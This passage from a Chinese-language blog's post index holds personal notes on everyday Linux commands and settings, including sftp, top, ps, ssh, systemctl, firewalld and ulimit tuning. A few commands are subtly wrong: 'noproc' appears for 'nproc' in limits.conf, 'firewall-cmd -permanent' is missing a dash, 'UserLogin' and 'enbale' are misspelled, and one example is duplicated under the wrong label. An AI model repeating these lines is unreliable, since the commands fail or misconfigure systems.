-s (signal) : 其中常用的一个信号(9) 杀死进程; 详细的信号可以用 kill -l\n    -l (signal) : 列出所有可用的信号名称\n\n范例：\n  1. 将 pid 为 323 的进程杀死 ： kill -9 323\n  2. 将 pid 为 456 的进程重跑 (restart) : kill -HUP 456\n```\n\n## scp：从其他机器拷贝文件夹\n\n```sh\n格式：scp -r 文件夹名(源) 用户名@机器名:/路径（目的）\n之后输入，目标机器的用户密码。\n```\n\n范例：\n\n```sh\nscp -r /index1/DAYAIR/Lucene/20160930  root@117.122.222.74:/index1/dayalib\n```\n\n## sftp：上传文件/下载\n\n- 连接到服务器\n\n  ```sh\n  # 1. 连接到远程服务器\n  sftp username@hostname\n  # 2. 指定端口连接 (默认22)\n  sftp -P port_number username@hostname\n  # 3. 使用密钥认证连接\n  sftp -i /path/to/private_key username@hostname\n  ```\n\n- 连接上服务器之后的常用命令\n\n  | 本地文件操作                | 远程文件操作                   | 文件传输                                             | 其他命令                             |\n  | --------------------------- | :----------------------------- | :--------------------------------------------------- | :----------------------------------- |\n  | `lls`   ： 列出本地目录内容 | `ls`   ： 列出远程目录内容     | `put local_file [remote_path]` ： 上传本地文件到远程 | `help`      ： 显示帮助信息          |\n  | `lcd`   ： 更改本地工作目录 | `cd`   ： 更改远程工作目录     | `get remote_file [local_path]` ： 下载远程文件到本地 | `exit` 或 `quit` ： 退出SFTP会话     |\n  | `lmkdir` ： 在本地创建目录  | `mkdir`  ： 在远程创建目录     | `mput local_files`       ： 上传多个本地文件         | `!command`    ： 在本地执行shell命令 |\n  | `lpwd`  ： 显示本地当前目录 | `pwd`   ： 显示远程当前目录    | `mget remote_files`       ： 下载多个远程文件        |                                      |\n  |                             | `rm`   ： 删除远程文件         |                                                      |                                      |\n  |                             | `rmdir`  ： 删除远程目录       |                                                      |                                      |\n  |                             | `rename` ： 重命名远程文件     |                                                      |                                      |\n  |                             | `chmod`  ： 更改远程文件权限   |                                                      |                                      |\n  |                             | `chown`  ： 更改远程文件所有者 |                                                      |                                      |\n  |                             |                                |                                                      |                                      |\n  |                             |                                |                                                      |                                      |\n\n\n- 实用示例（命令行直接传输）\n\n  ```sh\n    # 不进入交互模式,命令行直接传输文件\n    # 从远程下载文件\n    sftp username@hostname:/remote/file.txt /local/path/\n    \n    # 上传文件到远程\n    sftp username@hostname <<< $'put /local/file.txt /remote/path/'\n  ```\n\n- 实用示例（远程连接服务器之后）\n\n  ```sh\n  ############################################################\n  # 1. 上传下载文件\n  \n  # 上传文件\n  sftp> put local_file.txt /remote/path/\n  # 下载文件\n  sftp> get /remote/path/remote_file.txt ~/downloads/\n  \n  ############################################################\n  # 2. 批量传输\n  \n  # 上传所有.txt文件\n  sftp> mput *.txt\n  # 下载所有.jpg文件\n  sftp> mget *.jpg\n  \n  \n  ############################################################\n  # 3. 目录操作\n  \n  # 创建远程目录\n  sftp> mkdir new_folder\n  # 切换远程目录\n  sftp> cd /path/to/directory\n  # 列出远程目录内容\n  sftp> ls -l\n  \n  ############################################################\n  # 4. 保留文件属性传输\n  \n  # 上传并保留时间戳\n  sftp> put -p local_file.txt\n  # 下载并保留权限\n  sftp> get -P remote_file.txt\n  \n  ############################################################\n  ```\n\n\n\n- 高级用法\n\n  ```sh\n  #  1. 使用压缩传输\n  sftp -C username@hostname\n  \n  # 2. 限制带宽\n  sftp -l 100 username@hostname  # 限制为100 Kbit/s\n  \n  # 3. 使用代理连接\n  sftp -o \"ProxyCommand=nc -X connect -x proxy:port %h %p\" username@hostname\n  ```\n\n\n\n> 注意事项:\n>\n> 1. SFTP 不同于 FTP，它使用 SSH 端口(默认22)\n> 2. 文件传输是加密的，比传统FTP更安全\n> 3. 某些服务器可能限制文件大小或传输速率\n> 4. 使用密钥认证比密码认证更安全\n\n\n\n\n\n## top：实时显示系统中各个进程的资源占用状况\n\ntop是一个动态显示过程，即可以通过用户按键来不断刷新当前状态。如果在前台执行该命令，它将独占前台，直到用户终止该程序为止。比较准确的说，top命令提供了实时的对系统处理器的状态监视。它将显示系统中CPU最“敏感”的任务列表。该命令可以按CPU使用。内存使用和执行时间对任务进行排序；而且该命令的很多特性都可以通过交互式命令或者在个人定制文件中进行设定\n\n```sh\n命令说明\n1.  命令格式： top [参数]\n2.  命令功能： 显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率、CPU占用率等\n3.  命令参数\n        -b 批处理\n        -c 显示完整的治命令\n        -I 忽略失效过程\n        -s 保密模式\n        -S 累积模式\n        -i<时间> 设置更新间隔时间\n        -u<用户名> 指定用户名\n        -p<进程号> 指定进程\n        -n<次数>\n```\n\n> 补充top使用技巧：\n>\n> - 多核CPU监控在top基本视图中，按键盘数字“1”，可监控每个逻辑CPU的状况：\n>\n> - 高亮显示当前运行进程敲击键盘“b”（打开/关闭加亮效果 ）\n>\n> - 通过”shift + >”或”shift + <”可以向右或左改变排序列下图是按一次”shift + >”的效果图,视图现在已经按照%MEM来排序。\n\n范例：\n\n- 实例1：显示指定的进程信息\n\n  ```sh\n  top -p 2885\n  ```\n\n  ![image-20211125180715469](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125180715469.png) \n\n- 实例2: 循环显示的次数\n\n  ```sh\n  命令：  top -n 2\n  说明：表示更新两次后终止更新显示\n  ```\n\n- 实例3：显示进程信息，并具体说明\n\n  ![20211125181146934](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20211125181146934.png) \n\n\n\n命令输出的每一行的具体信息：\n\n| 内容                                               | 具体意义                                                     |\n| -------------------------------------------------- | ------------------------------------------------------------ |\n| 第一行：任务队列信息，同 **uptime** 命令的执行结果 | `top - 18:10:32 up  2:39,  2 users,  load average: 0.23, 0.11, 0.06`<br /><br />`18:10:32            `： 当前系统时间  <br/>`up  2:39            `： 系统已经运行了2小时39分钟（在这期间系统没有重启过） <br/>`2 users             `： 当前有2个用户登录系统  <br/>`load average: 0.23, 0.11, 0.06 `： load average后面的三个数分别是1分钟、5分钟、15分钟的负载情况。<br/>load average 数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。<br />如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。 |\n| 第二行：Tasks — 任务（进程）                       | `Tasks: 213 total,   1 running, 210 sleeping,   0 stopped,   2 zombie`<br/><br/>系统现在共有213个进程，其中处于运行中的有1个，210个在休眠，stoped状态的有0个，zombie状态（僵尸）的有2个 |\n| 第三行：cpu状态信息                                | `%Cpu(s):  0.7 us,  0.6 sy,  0.0 ni, 98.7 id,  0.0 wa,  0.0 hi,  0.1 si,  0.0 st`<br/><br/>在这里CPU的使用比率和windows概念不同，需要理解linux系统用户空间和内核空间的相关知识<br />`0.7 us `:用户空间占用CPU的百分比。<br/>`0.6 sy `:内核空间占用CPU的百分比。<br/>`0.0 ni `:改变过优先级的进程占用CPU的百分比<br/>`98.7 id`:空闲CPU百分比<br/>`0.0 wa `:IO等待占用CPU的百分比<br/>`0.0 hi `:硬中断（Hardware IRQ）占用CPU的百分比<br/>`0.1 si `:软中断（Software Interrupts）占用CPU的百分比<br/>`0.0 st `:虚拟机占用百分比 |\n| 第四行：内存状态                                   | `KiB Mem : 16212604 total,  4243632 free, 10135032 used,  1833940 buff/cache`<br/><br />`16212604 total     `: 物理内存总量<br/>`10135032 used      `: 使用中的内存总量：现在系统内核控制的内存数<br/>`4243632 free       `: 空闲内存总量：内核还未纳入其管控范围的数量<br/>`1833940 buff/cache `: 缓存的内存量<br /><br/>纳入内核管理的内存不见得都在使用中，还包括过去使用过的现在可以被重复利用的内存，内核并不把这些可被重新使用的内存交还到free中去，因此在linux上free内存会越来越少，但不用为此担心。<br/>若需要计算可用内存数，这里有个近似的计算公式：`第四行的free + 第四行的buffers + 第五行的cached/avail Mem`<br/><br/>对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了 |\n| 第五行：swap交换分区信息                           | `KiB Swap:  8126460 total,  8126460 free,        0 used.  5577340 avail Mem`<br /><br />`8126460 total     `: 交换区总量<br/>`0 used            `: 使用的交换区总量<br/>`8126460 free      `: 空闲交换区总量<br/>`5577340 avail Mem `: 可用交换取总量 |\n| 第六行 ：空行                                      |                                                              |\n| 第七行以下：各进程（任务）的状态监控：             | `PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND`<br/>`944 root      20   0  565168  10532   7440 S   0.7  0.1   0:36.70 NetworkManager`<br /><br />`PID    `:进程id<br/>`USER   `:进程所有者<br/>`PR     `:进程优先级<br/>`NI     `:nice值。负值表示高优先级，正值表示低优先级<br/>`VIRT   `:进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES<br/>`RES    `:进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA<br/>`SHR    `:共享内存大小，单位kb<br/>`S      `:进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程<br/>`%CPU   `:上次更新到现在的CPU时间占用百分比<br/>`%MEM   `:进程使用的物理内存百分比<br/>`TIME+  `:进程使用的CPU时间总计，单位1/100秒<br/>`COMMAND`:进程名称（命令名/命令行） |\n\n\n## netstat：网络工具\n\n`netstat` (network statistics) 是一个功能强大的网络工具，用于显示网络连接、路由表、接口统计等信息。虽然在新版 Linux 中逐渐被 `ss` 命令取代，但仍然是广泛使用的网络诊断工具。\n\n- 语法\n\n  ```sh\n  netstat [选项]\n  ```\n\n- 常用选项\n\n  | 分类         | 参数                                                         |\n  | ------------ | ------------------------------------------------------------ |\n  | 显示网络连接 | `-c`: 每隔一个固定时间，执行该netstat命令。<br /><br />`-a`: 显示所有连接（包括监听和非监听）<br/>`-t`: 显示 TCP 连接<br/>`-u`: 显示 UDP 连接<br/>`-n`: 以数字形式显示地址和端口（不解析主机名和服务名）<br/>`-l`: 仅显示监听状态的连接<br/>`-p`: 显示进程ID和程序名称（需要root权限）<br /> |\n  | 显示路由表   | `-r`：显示内核路由表<br/>`-e`：显示扩展信息                  |\n  | 显示接口统计 | `-i`:显示网络接口列表<br/>`-s`:显示各协议统计信息            |\n\n- 范例\n\n  ```sh\n  # 1. 显示所有网络连接\n  netstat -ap\n  # 2. 显示所有TCP连接\n  netstat -atp\n  # 3. 显示所有UDP连接\n  netstat -aup\n  # 4. 显示所有监听端口\n  netstat -l\n  # 5. 显示TCP监听端口(不解析主机名)\n  netstat -ltnp\n  # 6. 显示UDP监听端口(带进程信息)\n  sudo netstat -lupn\n  # 7. 显示路由表\n  netstat -r # 等同于 route -n\n  # 8. 显示网络接口统计\n  netstat -i\n  # 9. 显示各协议统计信息\n  netstat -s\n  # 10. 显示TCP连接及对应进程(需要root)\n  sudo netstat -tulp\n  # 11. 持续监控网络状态，每秒刷新一次\n  netstat -c\n  \n  ```\n\n- 输出字段解释\n\n  ```sh\n  # Active Internet connections：有源TCP连接\n  Proto: 协议类型(TCP/UDP)\n  Recv-Q: 接收队列中的数据量\n  Send-Q: 发送队列中的数据量\n  Local Address: 本地地址和端口\n  Foreign Address: 远程地址和端口\n  State: 连接状态(仅TCP)\n      LISTEN: 监听状态\n      ESTABLISHED: 已建立连接\n      TIME_WAIT: 等待结束\n      CLOSE_WAIT: 远程已关闭，本地等待关闭\n      \n  # Active UNIX domain sockets：有源Unix域套接口（和网络套接字一样，但是只能用于本机通信，性能可以提高一倍）\n  Proto  :显示连接使用的协议\n  RefCnt :表示连接到本套接口上的进程号\n  Type   :显示套接口的类型\n  State  :显示套接口当前的状态\n  Path   :表示连接到套接口的其它进程使用的路径名。\n  ```\n\n##  `！`命令\n\n`!` 符号在 Linux 中不但可以用作否定符号，还可以用来从历史命令记录中取出命令或不加修改的执行之前运行的命令。\n\n> 1. **空格敏感**：`!` 与后续字符间通常不能有空格（`! cmd` 除外）\n> 2. **历史扩展**：可通过关闭 `set +o histexpand` 禁用 `!` 的历史扩展功能\n> 3. **安全风险**：脚本中避免使用 `!`，可能意外触发历史命令\n\n1. 执行历史命令\n\n   `!n`：执行历史记录中第 n 条命令。如：`!203`   执行 history 列表中编号为 203 的命令\n\n   `!!`：重复执行上一条命令（相当于 !-1）\n\n   `sudo !!`： 用 sudo 重新运行上条命令\n\n   `!-n`：执行前第 n 条命令。如：`!-3`    执行当前命令往前数第 3 条命令\n\n   `!关键字`：执行==最近一条以 `关键字`开头==的命令。如：`!curl`  执行最近一次以 \"curl\" 开头的命令\n\n   `!?关键字?`：执行==最近一条任意位置包含 `关键字`==的命令。\n\n2. **组合其他修饰符**\n\n   ` :p `修饰符： 先预览命令而不直接执行。如：`!!:p`\n\n3. 引用历史命令的参数\n\n   `!:n`：引用上条命令的第 n 个参数（从 0 开始，0 是命令本身）\n\n   ```sh\n   ls /etc /home\n   echo !:1  # 输出 \"/etc\"（上条命令的第1个参数）\n   ```\n\n   `!^`：上条命令的第一个参数\n\n   ```sh\n   cp file.txt /backup/\n   ls !^    # 相当于 ls file.txt \n   ```\n\n   `!$`：上条命令的最后一个参数\n\n   ```sh\n   tar -czf archive.tar.gz /path/to/dir\n   rm !$    # 相当于 rm /path/to/dir\n   ```\n\n   `!*`：上条命令的所有参数\n\n   ```sh\n   mv dir1 dir2 dir3\n   echo !*  # 输出 \"dir1 dir2 dir3\"\n   ##########################################################\n   finsd -name \"foo.zip\" # 这里特意输错了find命令\n   find !* # find -name \"foo.zip\"\n   ```\n\n   `!:-`: 去掉上一条命令最后一个参数，再次执行\n\n   ```sh\n   mv dir1 dir2 dir3\n   echo !:-  # 输出 \"dir1 dir2\"\n   ```\n\n3. 替换历史命令中的字符串\n\n   `^old^new`：替换上条命令中的==第一个== old 为 new 并执行\n\n   `!!:gs/old/new`: 将上一命令中的==所有==old替换为new\n\n   `!scp:gs/old/new`：将上一个scp命令中的==所有==old替换为new\n\n   ```sh\n   cat /etc/host\n   ^host^hosts  # 相当于执行 cat /etc/hosts\n   ```\n\n4. 条件执行\n\n   `! cmd`：如果 cmd 的退出状态码 ≠ 0（失败），则执行后续命令\n\n   ```sh\n   root@TEST:/mnt/c/Users# ! ping -c1 test.com && echo \"Ping failed\"\n   PING test.com (3.18.255.247) 56(84) bytes of data.\n   \n   --- test.com ping statistics ---\n   1 packets transmitted, 0 received, 100% packet loss, time 0ms\n   \n   Ping failed\n   root@TEST:/mnt/c/Users#\n   ```\n\n5. 取反（逻辑非）\n\n   ```sh\n   # 删除除了cfg结尾以外的所有文件\n   rm !(*.cfg)\n   ```\n\n## PS ：显示当前进程的状态\n\n> `ps`（英文全拼：process status）命令用于显示当前进程的状态，类似于 windows 的任务管理器命令的参数系统有些特殊。\n>\n> `ps`命令支持三种不同风格的参数：UNIX 风格（单破折号）、BSD 风格（无破折号）和 GNU 风格（双破折号）。\n\n```sh\nps [选项]\n```\n\n- 进程选择参数\n\n  | 参数        | 全称/含义                  | 说明                               |\n  | :---------- | :------------------------- | :--------------------------------- |\n  | `-A`        | All                        | 显示所有进程                       |\n  | `-e`        | Every                      | 等同于 -A                          |\n  | `a`         | All with tty               | 显示所有终端关联的进程             |\n  | `-a`        | All except session leaders | 显示除会话首进程外的所有进程       |\n  | `r`         | Running                    | 仅显示运行中的进程                 |\n  | `x`         | Include no tty             | 显示无终端控制的进程（如守护进程） |\n  | `u`         | User-oriented              | 以用户为导向的格式显示             |\n  | `-u user`   | User                       | 显示指定用户的进程                 |\n  | `-p <pid>`  | Process ID                 | 显示指定PID的进程                  |\n  | `-C 命令名` | Command                    | 显示指定命令名的进程               |\n\n- 输出格式控制\n\n  | 参数          | 全称/含义     | 说明                     |\n  | :------------ | :------------ | :----------------------- |\n  | `-f`          | Full          | 完整格式显示             |\n  | `-F`          | Extra full    | 扩展完整格式             |\n  | `l`           | Long          | 长格式显示               |\n  | `j`           | Jobs          | 作业格式显示             |\n  | `-j`          | Job control   | 显示作业控制信息         |\n  | `-H`          |               | 显示进程层次结构（树状） |\n  | `-o format`   | Output format | 自定义输出格式           |\n  | `--sort spec` | Sort by       | 按指定字段排序           |\n\n- 显示线程\n\n  | 参数 | 说明                    |\n  | :--- | :---------------------- |\n  | `-L` | 显示线程（LWP和NLWP列） |\n  | `-T` | 显示线程（SPID列）      |\n  | `-m` | 在进程后显示线程        |\n\n- 常用选项组合\n\n  `ps -ef | grep tomcat`:  ==UNIX风格参数（单破折号）==  获取所有进程的完整信息，并查找特定进程\n\n  `ps aux | grep tomcat`: ==BSD风格参数（无破折号）==  获取所有进程的完整信息，并查找特定进程\n\n  `ps aux --sort=-%mem | head`: 按内存使用排序\n\n   `ps -T -p <PID>`：==显示进程的线程==\n\n   `ps eww -p <PID>`：==显示进程的环境变量==\n\n  \n\n  `ps -ejH` : 显示进程树状结构\n\n  `ps -eLf`：显示线程信息\n\n  \n\n## ssh：远程登陆\n\n> `ssh` (Secure Shell) 是用于安全远程登录和执行命令的协议和工具，提供加密的通信会话。\n\n```sh\n格式: ssh 用户名@机器名\n范例: ssh rd@build01\n```\n\n 常用选项\n\n| 选项                              | 描述                                          |\n| :-------------------------------- | :-------------------------------------------- |\n| `-p <端口>`                       | 指定远程服务器端口（默认22）                  |\n| `-i <密钥文件>`                   | 指定身份认证私钥文件                          |\n| `-l <用户名>`                     | 指定登录用户名                                |\n| `-v`                              | 详细模式（可重复使用增加详细程度：-vv, -vvv） |\n| `-X`                              | 启用X11转发                                   |\n| `-Y`                              | 启用可信X11转发                               |\n| `-L <本地端口:目标主机:目标端口>` | 本地端口转发                                  |\n| `-R <远程端口:目标主机:目标端口>` | 远程端口转发                                  |\n| `-D <端口>`                       | 动态端口转发（SOCKS代理）                     |\n| `-N`                              | 不执行远程命令（仅用于端口转发）              |\n| `-f`                              | 后台运行                                      |\n| `-C`                              | 压缩数据传输                                  |\n| `-q`                              | 安静模式（抑制警告和诊断信息）                |\n\n\n\n基本使用：\n\n```sh\n# 1. 基本登录\nssh username@hostname\n# 2. 指定端口登录\nssh -p 2222 username@hostname\n# 3. 使用密钥认证登录\nssh -i ~/.ssh/id_rsa username@hostname\n# 4. 直接执行远程命令\nssh username@hostname \"ls -l /tmp\"\n# 5. 调试连接\nssh -vvv username@hostname\n```\n\n配置文件配置常用连接\n\n> `~/.ssh/config` 配置文件可以保存常用的SSH配置：\n>\n> ```\n> Host myserver\n>     HostName server.example.com\n>     User username\n>     Port 2222\n>     IdentityFile ~/.ssh/id_rsa\n>     Compression yes\n> ```\n>\n> 配置后可以简化为：\n>\n> ```\n> ssh myserver\n> ```\n\n密钥管理\n\n```sh\n# 创建目录\nmkdir -p /opt/ssh_test\n\n# 1. 生成密钥对\nssh-keygen -t rsa -b 4096\n\n# 2. 复制公钥到服务器\nssh-copy-id username@hostname\n\n# 3. 添加到ssh-agent\neval \"$(ssh-agent -s)\" # 启动并设置环境变量\nssh-add ~/.ssh/id_rsa  # 添加密钥\n\n# 4. 列出已加载密钥\nssh-add -l\n\n# 5. 删除密钥\nssh-add -d ~/.ssh/id_rsa  # 删除指定密钥\nssh-add -D                # 删除所有密钥\n\n# 6. 关闭 ssh-agent\neval \"$(ssh-agent -k)\"  # 正常关闭\nkill $SSH_AGENT_PID     # 强制终止\n```\n\n## systemctl：系统服务\n\n`systemctl` 是 systemd 系统和服务管理器的控制工具，用于管理 Linux 系统的服务、挂载点、套接字等单元(unit)。\n\n```\nsystemctl [选项] [命令] [单元名称]\n```\n\n\n\n| 分类                                 | 命令                                                         |\n| ------------------------------------ | ------------------------------------------------------------ |\n| 服务管理常用命令：启动/停止/重启服务 | `systemctl start <服务名>`：启动服务<br/>`systemctl stop <服务名>`：停止服务<br/>`systemctl restart <服务名>`：重启服务<br/>`systemctl reload <服务名>`：重新加载配置(不重启)<br/>`systemctl try-restart <服务名>`：仅在服务运行时重启 |\n| 服务管理常用命令：开机启用/禁用服务  | `systemctl enable <服务名>`     ： 设置开机自启<br/>`systemctl disable <服务名>`    ： 取消开机自启<br/>`systemctl reenable <服务名>`   ： 重新设置开机自启<br/>`systemctl is-enabled <服务名>` ： 检查是否开机自启 |\n| 服务管理常用命令：查看服务状态       | `systemctl status <服务名>`           ： 查看服务详细状态<br/>`systemctl is-active <服务名>`        ： 检查服务是否运行<br/>`systemctl list-units --type=service` ： 列出所有服务单元<br/>`systemctl list-unit-files| grep enbale`：查看开机启动的服务列表<br />`systemctl --failed --type=service`   ： 列出失败的服务 |\n| 系统管理命令：系统状态           | `systemctl status`       ： 系统整体状态<br/>`systemctl list-units`   ： 显示所有活动单元<br/>`systemctl list-sockets` ： 显示所有套接字<br/>`systemctl list-timers`  ： 显示所有定时器 |\n| 系统管理命令：系统控制           | `systemctl poweroff`     ： 关机    <br/>`systemctl reboot`       ： 重启    <br/>`systemctl suspend`      ： 挂起    <br/>`systemctl hibernate`    ： 休眠    <br/>`systemctl hybrid-sleep` ： 混合休眠 |\n| 日志管理                         | `journalctl -u <服务名>`          ： 查看指定服务的日志  <br/>`journalctl -f -u <服务名>`       ： 实时跟踪服务日志    <br/>`journalctl --since \"2023-01-01\"` ： 查看指定时间后的日志<br/>`journalctl --disk-usage`         ： 查看日志磁盘使用情况 |\n| 用户服务管理(需要 `--user` 参数) | `systemctl --user start <服务名>`  ： 启动用户服务<br/>`systemctl --user enable <服务名>` ： 启用用户服务自启<br/>`systemctl --user list-units`      ： 列出用户单元 |\n|                                  |                                                              |\n\n范例：\n\n```sh\n# 1. 查看 nginx 服务状态\nsystemctl status nginx\n# 2. 设置 docker 开机自启并立即启动\nsystemctl enable --now docker\n# 3. 查看所有失败的服务\nsystemctl --failed\n# 4. 分析服务启动时间\nsystemctl enable --now docker\n# 5. 分析服务启动时间\nsystemd-analyze blame\n# 6. 临时修改服务配置(重启后失效):\nsystemctl edit --full <服务名>\n```\n\n> 1. 大多数管理命令需要 root 权限\n> 2. 修改单元文件后需要 `daemon-reload`\n> 3. 用户服务与系统服务是隔离的\n> 4. 不同发行版的 systemd 版本可能有差异\n\n`systemctl` 是现代 Linux 系统管理的核心工具，熟练掌握可以高效管理系统服务。\n\n\n\n## openssl： 加密工具包\n\nOpenSSL 是一个强大的开源加密工具包，提供了各种加密、证书管理和 SSL/TLS 功能。以下是 OpenSSL 的常用命令和用法。\n\n```sh\nopenssl [命令] [选项] [参数]\n```\n\n举例：\n\n```sh\n# 生成密钥\nopenssl rand -base64 32  # 生成 32 字节随机字符串\n```\n\n","tags":["Linux"],"categories":["Linux","基础命令"]},{"title":"Linux查看系统信息命令","url":"/20250619/b2009fa9.html","content":"\n\n\n# 综合信息工具\n\n```sh\ninxi -Fxz           # 显示完整系统信息 (需安装 inxi)\nscreenfetch         # 显示美观的系统信息 (需安装)\nneofetch            # 另一种美观的系统信息工具 (需安装)\n```\n\n\n\n# Linux机器是32位还是64位\n\n```sh\ngetconf LONG_BIT\n```\n\n# 查看系统发行版：lsb_release\n\n```sh\n# 显示发行版详细信息\ncat /etc/os-release  \n# 显示 LSB (Linux Standard Base) 信息\nlsb_release -a       \n \n#############################################\n# 特定发行版命令\n \n# CentOS/RHEL\ncat /etc/redhat-release\ncat /etc/centos-release\n\n# Debian/Ubuntu\ncat /etc/debian_version\nlsb_release -a\n```\n\n# 显示主机名和系统信息\n\n```sh\nhostnamectl\n```\n\n# 查看系统基本信息：uname\n\n```sh\nuname -a  # 显示所有信息\nuname -s  # 内核名称\nuname -n  # 网络节点主机名\nuname -r  # 内核发行版本\nuname -m  # 机器硬件名称\n```\n\n# 查看内核信息\n\n```sh\ncat /proc/version     # 内核版本和编译器信息\ndmesg | grep Linux    # 从内核环缓冲区查看启动信息\n```\n\n#  查看 CPU 信息\n\n```sh\nlscpu                # 显示 CPU 架构信息\ncat /proc/cpuinfo    # 详细 CPU 信息\nnproc                # 显示 CPU 核心数\n```\n\n#  系统磁盘信息：df\n\n```shell\ndf -h               # 显示磁盘空间使用情况\nlsblk               # 显示块设备信息\nfdisk -l            # 显示磁盘分区表\n```\n\n# 系统内存条信息\n\n```sh\n# apt install dmidecode\ndmidecode -t memory\n```\n\n#  查看内存使用情况\n\n```sh\nfree -h             # 以易读格式显示内存使用情况\ncat /proc/meminfo   # 详细内存信息\nvmstat -s           # 显示内存统计\n```\n\n# 查看网络信息\n\n```sh\nip a                # 显示所有网络接口\nifconfig            # 较旧的网络接口信息工具\nnetstat -tulnp      # 显示网络连接和监听端口\nss -tulnp           # 更现代的 socket 统计工具\n```\n\n\n\n# 进程状态：ps\n\n```sh\n格式：ps [options] [--help]\n参数：\n-A 列出所有的线程\n-e 列出所有的进程\n-f 显示详细的信息（包括命令行参数）\n\n例子: 查看java进程信息\nps -ef|grep java\n```\n\n# 查看系统用户信息：who\n\n```sh\n格式 : who -[husfV] [user]\n说明 : 显示有哪些用户登录到系统中，显示的信息包含用户ID，使用的终端，上线时间，呆滞时间，CPU使用量，动作等等。\n参数说明 :\n    -H : 显示标题列\n    -u : 显示用户的闲置时间\n    -s : 使用简短的格式来显示\n    --version : 显示程式版本\n    -r 查看当前系统运行时间\n    -b 查看最后一次系统启动的时间。\n\n相关命令 : who am i  显示当前用户是谁\n\n例子： 查看最后启动时间\n          who -b\n```\n\n","tags":["Linux"],"categories":["Linux","基础命令"]},{"title":"Linux防火墙","url":"/20250619/e26546c7.html","content":"\n\n\n# Centos 防火墙\n\n## firewall服务\n\n```sh\n\n# 查看默认防火墙状态\nfirewall-cmd --state\n\n# 启动\nsystemctl start firewalld\n# 开机启动\nsystemctl enable firewalld\n\n# 重新载入，更新防火墙规则\nfirewall-cmd --reload\n\n\n# 关闭防火墙\nsystemctl stop firewalld.service \n# 或者关闭防火墙\nsystemctl disable firewalld.service\n\n\n# 重启防火墙\nsystemctl restart firewalld.service\n\n```\n\n## firewall配置\n\n\n\n- 查看防火墙规则\n\n    ```sh\n    # 查看全部端口\n    firewall-cmd --zone=public --list-ports\n    # 全部规则\n    firewall-cmd --list-all\n    # 查看指定端口\n    firewall-cmd --zone=public --query-port=3306/tcp\n    \n    ```\n\n- 查看区域信息\n\n    ```sh\n    firewall-cmd --get-active-zones\n    firewall-cmd --list-all-zones\n    ```\n\n- 暴露端口\n\n    ```sh\n    #添加端口 \n    firewall-cmd --permanent --zone=public --add-port=3306/tcp\n    #删除端口\n    firewall-cmd  -permanent --remove-port=3306/tcp \n    ```\n\n- IP白名单（添加）\n\n    ```sh\n    # 添加白名单\n    firewall-cmd --permanent --zone=trusted --add-source=10.42.0.15\n    # 移除白名单\n    firewall-cmd --permanent --zone=trusted --remove-source=10.42.0.15\n    # 更新防火墙规则\n    firewall-cmd  --reload\n    # 查看IP白名单\n    firewall-cmd  --zone=trusted --list-all\n    \n    \n    \n    #开启某个端口(指定IP可访问)\n    firewall-cmd --permanent --zone=public --add-rich-rule='rule family=\"ipv4\" source address=\"10.1.1.14/32\" port protocol=\"tcp\" port=\"80\" accept'\n    #删除策略\n    firewall-cmd --permanent --zone=public --remove-rich-rule='rule family=\"ipv4\" source address=\"10.1.1.14/32\" port protocol=\"tcp\" port=\"80\" accept'\n    \n    \n    \n    # 把docker0网卡添加到trusted域\n    firewall-cmd --permanent --zone=trusted --change-interface=docker0\n    ```\n\n\n\n","tags":["Linux"],"categories":["Linux","防火墙"]},{"title":"Linux日常使用","url":"/20250619/fb3eb231.html","content":"\n\n\n#  提高打开文件限制量\n\n1. 解除 Linux 系统的最大进程数和最大文件打开数限制\n\n   ```sh\n   vi /etc/security/limits.conf\n   \n   # 添加如下的行\n   # 说明：* 代表针对所有用户 noproc 是代表最大进程数 nofile 是代表最大文件打开数\n   \n    * soft noproc 11000\n    * hard noproc 11000\n   \n    * soft nofile 4100\n    * hard nofile 4100\n   ```\n\n2. 让 SSH 接受 Login 程式的登入，方便在 ssh 客户端查看 `ulimit -a ` 资源限制：\n\n   ```sh\n   vi /etc/ssh/sshd_config\n    \n   # 把 UserLogin 的值改为 yes，并把 # 注释去掉\n   # 重启 sshd 服务： /etc/init.d/sshd restart\n   ```\n\n3. 修改所有 linux 用户的环境变量文件：\n\n   ```\n   vi /etc/profile\n   \n   ulimit -u 10000\n   ulimit -n 4096\n   ulimit -d unlimited\n   ulimit -m unlimited\n   ulimit -s unlimited\n   ulimit -t unlimited\n   ulimit -v unlimited\n   ```\n\n\n\n\n\n#  Linux系统增加zysong字体\n\n> 背景：在开发项目中，使用到了Jfreechart，在本机环境测试正常，部署到服务器上Linux，发现Jfreechart里面的中文不能正常显示。\n\n1. 首先确认你的服务器上的`javahome` ，执行命令` echo $JAVA_HOME` ,显示出java的目录 \n2. 将zysong.ttf文件拷贝到`%JavaHome%/jre/lib/fonts`目录下 `zysong.ttf` 需要网上下载 \n3. 在`%JavaHome%/jre/lib/fonts`目录下执行`\"ttmkfdir -o fonts.dir\"`命令,重新生成`fonts.dir`文件 \n4. 确认`/usr/share/zh_CN/TrueType`目录存在,如果不存在则`mkdir`创建 ，，一般开始是没有的，所有这样执行：到`/usr/share/fonts`下，`mkdir zh_CN` 命令创建 `zh_CN`文件夹，到zh_CN目录下 `mkdir TrueType`命令创建`TrueType`文件夹 \n5. 把`zysong.ttf`文件拷贝到`TrueType`下 \n6. 在`%JavaHome%/jre/lib`目录下,执行` cp fontconfig.RedHat.3.properties.src fontconfig.properties`\n7. 重新启动`tomcat`（resin等web容器）,现在再看看，中文显示正常了\n\n\n\n# VMware安装Centos虚拟机\n\n==安装系统==\n\n1. 准备安装VMware和下载Centos\n\n2. 虚拟网络说明\n\n- VMNet1\n\n  ```\n  使用的是host-only的链接模式，即虚拟机只能与主机构成内部通信，无法对外网进行访问。\n  ```\n\n- VMNet0\n\n  ```\n  模式：使用桥接模式，安装VM后，在VM里建立虚拟机 默认 就是该模式。\n  场景：如果你只是需要一台虚拟机可以和宿主互通，并可以访问外网，此模式即可。\n  